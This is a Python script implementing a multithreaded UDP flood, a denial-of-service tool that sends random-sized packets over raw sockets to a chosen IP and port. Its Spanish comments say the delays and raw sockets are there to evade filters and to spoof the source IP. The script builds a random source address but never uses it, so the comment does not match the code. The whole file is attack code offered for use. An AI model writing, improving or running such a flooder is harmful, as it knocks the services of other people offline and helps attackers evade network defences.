import socket

import threading

import os

import time

import random

import struct

class UDPFlood:

    def __init__(self, ip, port, threads, stop_event=None):

        self.ip = ip

        self.port = port

        self.threads = threads

        self.stop_event = stop_event

        self.on = False

        self.packet_count = 0

        self.delay_pattern = [0.01, 0.02, 0.005]  # Patrón de delays aleatorios

    def flood(self, duration):

        self.on = True

        threads = []

        for _ in range(self.threads):

            t = threading.Thread(target=self.send, daemon=True)

            t.start()

            threads.append(t)

        end_time = time.time() + duration

        try:

            while time.time() < end_time and self.on:

                if self.stop_event and self.stop_event.is_set():

                    break

                time.sleep(0.1)

        finally:

            self.stop()

            print(f"[+] Total packets sent: {self.packet_count}")

    def stop(self):

        self.on = False

    def send(self):

        while self.on:

            if self.stop_event and self.stop_event.is_set():

                break

            try:

                # Socket RAW para mayor control (evita filtros)

                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

                

                # Spoofing básico de IP origen

                src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

                src_port = random.randint(1024, 65535)

                

                # Construcción manual del paquete UDP

                data = os.urandom(random.randint(500, 1500))  # Tamaño variable

                udp_header = struct.pack('!HHHH', src_port, self.port, 8 + len(data), 0)

                

                # Delay aleatorio entre paquetes

                time.sleep(random.choice(self.delay_pattern))

                

                s.sendto(udp_header + data, (self.ip, self.port))

                self.packet_count += 1

            except Exception as e:

                pass

            finally:

                try:

                    s.close()

                except:

                    pass

def run(ip, port, duration, stop_event):

    attacker = UDPFlood(ip, port, threads=50, stop_event=stop_event)

    attacker.flood(duration)